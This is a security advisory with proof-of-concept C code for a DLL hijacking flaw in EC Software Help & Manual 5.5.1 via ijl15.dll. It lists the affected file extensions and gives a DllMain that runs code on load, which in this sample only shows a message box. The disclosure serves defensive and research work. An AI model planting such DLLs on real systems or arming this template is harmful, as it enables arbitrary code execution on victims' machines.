source: http://www.securityfocus.com/bid/47349/info

EC Software Help & Manual is prone to an arbitrary-code-execution vulnerability.

An attacker can exploit this issue by enticing a legitimate user to use the vulnerable application to open a file from a network share location that contains a specially crafted Dynamic Link Library (DLL) file.

Help & Manual 5.5.1 Build 1296 is vulnerable; other versions may also be affected. 

/*


Help & Manual Professional Edition 5.5.1 (ijl15.dll) DLL Hijacking Exploit

Vendor: EC Software GmbH
Product web page: http://www.helpandmanual.com
Affected version: 5.5.1 Build 1296

Summary: Help & Manual 5 is a single-source help authoring and content
management system for both single and multi-author editing.

Desc: Help & Manual suffers from a DLL hijacking vulnerability that enables
the attacker to execute arbitrary code on the affected machine. The vulnerable
extensions are hmxz, hmxp, hmskin, hmx, hm3, hpj, hlp and chm thru ijl15.dll
Intel's library.

Tested on: Microsoft Windows XP Professional SP3 EN

Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
                            liquidworm gmail com


Advisory ID: ZSL-2011-5009
Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2011-5009.php


06.04.2011


*/


#include <windows.h>

BOOL WINAPI DllMain (HANDLE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{

	switch (fdwReason)
	{
		case DLL_PROCESS_ATTACH:
		dll_mll();
		case DLL_THREAD_ATTACH:
		case DLL_THREAD_DETACH:
		case DLL_PROCESS_DETACH:
		break;
	}

	return TRUE;
}

int dll_mll()
{
	MessageBox(0, "DLL Hijacked!", "DLL Message", MB_OK);
}